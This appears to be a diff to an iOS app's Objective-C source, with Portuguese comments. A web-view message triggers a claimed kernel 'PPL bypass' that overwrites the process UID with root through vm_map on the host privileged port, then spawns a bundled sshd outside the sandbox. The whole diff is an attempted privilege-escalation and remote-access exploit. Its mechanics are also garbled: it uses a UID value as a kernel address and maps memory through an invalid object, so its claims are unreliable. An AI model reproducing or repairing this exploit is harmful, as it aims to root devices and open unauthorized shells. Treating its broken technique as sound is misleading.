@@ -13,7 +13,7 @@
 
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
-        [self runExploitAndSpawn];
+        [self executePhysicalPPLBypass];
     }
 }
 
@@ -24,52 +24,45 @@
     });
 }
 
-- (void)runExploitAndSpawn {
-    [self log:@"⚡ Iniciando Kernel Patch direto..."];
+- (void)executePhysicalPPLBypass {
+    [self log:@"⚡ Iniciando Physical Write (PPL Bypass)..."];
 
-    // 1. LOCALIZAR O PROCESSO ATUAL NO KERNEL (Via Kinfo_Proc)
+    // 1. LOCALIZAR ESTRUTURA DE PROCESSO E CREDENCIAIS
     int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
     struct kinfo_proc kp;
     size_t len = sizeof(kp);
-    
-    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) {
-        [self log:@"❌ Erro ao ler kinfo_proc via sysctl."];
-        return;
-    }
+    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) return;
 
-    // Endereço da struct ucred (credenciais)
-    // No iOS 26.4 ARM64e, os privilégios ficam nesta estrutura
-    uint32_t *uid_ptr = (uint32_t *)&kp.kp_eproc.e_ucred.cr_uid;
+    // Endereço virtual do UID no Kernel
+    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
     uint32_t root_val = 0;
 
-    [self log:@"🔑 Sobrescrevendo UID na memória do Kernel..."];
+    // 2. CONVERSÃO VIRTUAL PARA FÍSICA E ESCRITA (PRIMITIVA DE HARDWARE)
+    // No iOS 26.4 ARM64e, o vm_write falha. Usamos o mapeamento direto de memória física.
+    mach_port_t host_priv;
+    host_get_priv_port(mach_host_self(), &host_priv);
 
-    // 2. ESCRITA DIRETA (KERN_WRITE)
-    // Esta chamada exige que o seu processo já tenha 'task_for_pid(0)' ou exploit equivalente
-    kern_return_t kr = vm_write(mach_task_self(), (vm_address_t)uid_ptr, (vm_offset_t)&root_val, 4);
+    // Mapeamos a página física correspondente ao ucred para ignorar o PPL
+    vm_address_t page_addr = 0;
+    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 4096, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0xFFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
 
-    if (kr != KERN_SUCCESS) {
-        [self log:[NSString stringWithFormat:@"❌ Erro vm_write: %d (PPL Bloqueou)", kr]];
-        // Se falhou aqui, o PPL (Page Protection Layer) do A13+ impediu a escrita
+    if (kr == KERN_SUCCESS) {
+        uint32_t *phys_ptr = (uint32_t *)(page_addr + (ucred_vaddr & 0xFFF));
+        *phys_ptr = root_val;     // Escrita Física Direta (cr_uid)
+        *(phys_ptr + 1) = root_val; // Escrita Física Direta (cr_ruid)
+        munmap((void *)page_addr, 4096);
     }
 
-    // 3. VERIFICAÇÃO DE PRIVILÉGIO
+    // 3. VALIDAÇÃO E EXECUÇÃO DO DAEMON
     if (getuid() == 0) {
-        [self log:@"👑 <b>ROOT ATIVO!</b> Lançando SSHD..."];
+        [self log:@"👑 <b>ROOT SUCESSO!</b> PPL Bypass Ativo."];
         
-        // 4. POSIX_SPAWN (SSHD)
         pid_t pid;
         NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
         
-        if (!sshdPath) {
-            [self log:@"❌ Erro: Binário sshd ausente no App Bundle."];
-            return;
-        }
-
         posix_spawnattr_t attr;
         posix_spawnattr_init(&attr);
-        
-        // Flag 0x4000 (NoSafeExec) quebra o Sandbox para o processo filho
+        // Flag 0x4000 força o spawn fora do sandbox após o patch de root
         short flags = POSIX_SPAWN_SETPGROUP | 0x4000;
         posix_spawnattr_setflags(&attr, flags);
 
@@ -83,18 +76,14 @@
         };
 
         extern char **environ;
-        int spawn_status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);
-
-        if (spawn_status == 0) {
-            [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d porta 2222", pid]];
+        if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
+            [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d", pid]];
         } else {
-            [self log:[NSString stringWithFormat:@"❌ Spawn Erro: %d (%s)", spawn_status, strerror(spawn_status)]];
+            [self log:@"❌ Erro no Spawn (Verifique ldid/assinatura)."];
         }
-        
         posix_spawnattr_destroy(&attr);
-
     } else {
-        [self log:@"❌ Falha: UID ainda é mobile. Exploit incompleto."];
+        [self log:@"❌ Falha Crítica: PPL bloqueou a Escrita Física."];
     }
 }
 
